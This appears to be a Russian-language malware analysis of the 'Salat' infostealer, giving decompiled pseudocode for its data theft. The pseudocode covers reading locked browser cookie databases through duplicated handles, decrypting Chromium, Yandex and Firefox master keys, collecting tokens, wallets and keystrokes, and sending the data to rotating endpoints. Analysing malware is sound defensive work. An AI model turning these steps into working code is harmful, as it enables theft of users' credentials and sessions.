# Как Salat крадёт данные

Псевдокод ниже построен по декомпиляции второй стадии (имена функций из IDA). Он не исполняемый. Что проверено по коду, а что нет, помечено в тексте.
Признаки из образца с адресами выводит `python -m salatkit.indicators stage2.bin`.

## Общий порядок

`main.Steal` вызывает сборщики и складывает результат в zip в памяти. По списку вызовов функции `Steal` (порядок внутри автомата не восстановлен):

```text
Steal():
    admin = isAdmin()
    shot  = getScreen()
    procs = processes()
    discord  = getDiscord()
    steam    = getSteams()
    chromium = GetChromiumMasterKeys() -> getChrome()
    gecko    = GetGeckoMasterKey() -> getGecko()
    for file in collected: zip.CreateHeader(name_with_timestamp); copy(file)
    body = base64(json(meta))
    rq(endpoint, zip, body)
    on failure: changeEndpoint(); sleep(); retry
```

## Обход блокировки базы

Открытый браузер держит `Cookies` заблокированными. Стилер не закрывает браузер, а читает файл через чужой хендл. Цепочка вызовов из `getChromeCookies` (проверено по списку вызовов):

```text
getChromeCookies(path):
    if not exists(path): return
    getlock(path)
    data = readProcFile(path)
    tmp  = os.CreateTemp()
    tmp.Write(data)
    db   = sql.Open("sqlite", tmp + "?mode=ro&immutable=1&nolock=1")
    for row in db.Query("SELECT ... FROM cookies"):
        value = DecryptChrome(row.encrypted_value)
    unlockProcs()

readProcFile(path):
    for h in NtQuerySystemHandles():
        if basename(name_of(h)).lower() == basename(path).lower():
            local = duplicateHandle(owner_process, h)
            return readFileFromHandle(local)

unlockProcs():
    for pid in holders:
        suspendProcessThreads(pid)
    wait with timer
    closeHandle(...)
```

Параметры подключения (`mode=ro`, `immutable`, `nolock`) взяты из строк образца. Как они собираются в одну строку и какой запрос идёт к `cookies`, я не проверял.

Что именно вызывает `getlock` (через `LazyProc.Call`), я не определял. По набору вызовов (имя файла в UTF-16, счётчик процессов) это похоже на поиск процессов, державших файл, но API я не подтверждал.

## Ключи Chromium

`GetChromiumMasterKeys` (по списку вызовов):

```text
GetChromiumMasterKeys(user_data):
    state = json.Unmarshal(ReadFile(user_data + "\Local State"))
    old   = base64(state.os_crypt.encrypted_key)
    key   = DPAPI(old)
    app   = base64(state.os_crypt.app_bound_encrypted_key)
    key2  = decryptAPPB(app)
    StartAPPB()
```

- `DPAPI` расшифровывает ключ `os_crypt.encrypted_key` через `CryptUnprotectData`.
- `decryptAPPB` декодирует base64, расшифровывает DPAPI, затем AES-GCM.
- `StartAPPB` запускает отдельный процесс через `os/exec` и обменивается с ним по stdin и stdout с таймером. Для App-Bound ключа нужны права SYSTEM. В образце есть строки `failed to find LSASS process`, `failed to impersonate SYSTEM` и вызовы `DuplicateTokenEx`. Как именно связаны `StartAPPB` и получение токена, я не трассировал.

## Яндекс.Браузер

Проверено по декомпиляции `getLocalEncryptorDataKey`:

```text
blob = db.QueryRow("SELECT value FROM meta WHERE key = 'local_encryptor_data'")
i = bytes.Index(blob, marker3)
if i < 0: error("couldn't find encrypted key")
enc = blob[i + 3:]
if len(enc) < 96: error("invalid encrypted key")
plain = AESGCM256(master).Open(nonce=enc[:12], data=enc[12:])
if plain[:4] != signature4: error("invalid signature")
key = plain[4:]
if len(key) < 32: error("invalid decrypted key")
return key[:32]
```

## Firefox

`GetGeckoMasterKey` без `nss3.dll` (проверено по списку вызовов и строке запроса):

```text
db = sql.Open(join(profile, "key4.db"))
row = db.QueryRow("SELECT a11, a102 FROM nssPrivate")
bytes.Index(...) on the row data
pbe = NewASN1PBE(...)
master = pbe decrypt
```

Дальше `getGeckoLogins` и `getGeckoCookies` расшифровывают `logins.json` и `cookies.sqlite` этим ключом.

## Остальное

| Источник | Что берётся | Как |
|---|---|---|
| Discord | токены | `getDiscord`, каталоги `leveldb`, запись в `Tokens.txt` |
| Steam | токены и аккаунты | `getSteams`, разбор `config.vdf` и `local.vdf` библиотекой vdf |
| Telegram | `tdata` | поиск процесса (`found tg process`), копирование каталога |
| Кошельки | расширения и файлы | `Local Extension Settings`, списки идентификаторов расширений |
| Экран | скриншот | GDI (`GetDIBits`), `salat_screenshot.Capture` |
| Ввод | буфер обмена, клавиши | `getClipboardText`, `SetWinEventHook` и `runKeylogger` |

SQLite встроен в бинарник и работает поверх WebAssembly, внешних DLL нет.

## Отправка

Данные упаковываются в `archive/zip`, метаданные кодируются в JSON и base64 и уходят через `rq` на адреса из `endpoints.py`. При ошибке `changeEndpoint` переключает адрес. Формат тела запроса я не восстанавливал.

## Что не проверено

- API внутри `getlock`.
- Связь `StartAPPB` и токена SYSTEM.
- Формат запроса к C2.
- Порядок вызовов внутри `Steal`.
